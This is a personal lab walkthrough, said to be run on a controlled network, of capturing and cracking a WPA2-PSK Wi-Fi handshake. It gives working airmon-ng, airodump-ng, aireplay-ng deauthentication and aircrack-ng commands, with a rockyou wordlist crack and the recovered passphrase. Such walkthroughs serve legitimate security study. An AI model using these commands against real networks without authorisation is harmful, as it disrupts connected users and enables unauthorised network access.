
> [!info]
> This was performed on a controlled network, meaning everything performed was both legal and ethical.

This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my [Wireless Cheatsheet](../Tools/Wireless%20Cheatsheet.md).

## Overview
---
WPA2-PSK (also known as WPA2-Personal) is one of the most commonly used types Wi-Fi network authentication -- most common in home or public settings.

The PSK stands for "Pre-Shared Key", meaning authentication is handled via a single pre-shared passphrase, aka a static password.  All devices and users connecting to the network must know and use this passphrase.

This means for authentication, a bad actor must capture the handshake between an end-user and the network, then crack that handshake to acquire the network's password.

## Capturing the WPA Handshake
---

```bash
# View Current WiFi Driver
sudo airmon-ng
# Create Monitor Interface
sudo airmon-ng start <interface>
```

![[Pasted image 20231015005332.png]]

With the monitor interface configured, next I began sniffing the network to find what networks are available.

```shell
# See available networks/channels/security
sudo airodump-ng <mon_interface>
```
*(In this case, my monitor interface is wlan0mon)*

![[Pasted image 20231015185528.png]]

This revealed the SSID of the WPA2-PSK network, that it's on channel 4, and that the MAC address is "02:13:37:BE:EF:03".

With this knowledge, I restarted my "airodump" listener, refining it to focus specifically on the target network.

```shell
sudo airodump-ng --bssid "02:13:37:BE:EF:03" -c 4 --write "<network_ssid>" wlan0mon
```

In a separate terminal, I validated that the network was vulnerable to a deauth attack before performing the actual attack.

```shell
# Perform an injection test
sudo aireplay-ng -9 -a "02:13:37:BE:EF:03" wlan0mon

# Perform a de-authentication attack
sudo aireplay-ng --deauth 100 -a "02:13:37:BE:EF:03" wlan0mon
```

![[Pasted image 20231015185859.png]]

![[Pasted image 20231015185925.png]]

After performing the de-authentication attack, I was able to capture a WPA handshake.

![[Pasted image 20231015190024.png]]

After capturing the WPA handshake, I closed my "airodump" listener and disabled my monitor interface.

![[Pasted image 20231015175905.png]]


## Cracking the Passphrase
---

With the WPA handshake captured, I was able to crack the passphrase by using "aircrack-ng" -- feeding the "airodump" capture as the target and "rockyou.txt" to it as the wordlist.

```shell
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt ./<network_ssid>-01.cap
```

![[Pasted image 20231015190419.png]]

```
Passphrase: 1q2w3e4r
```
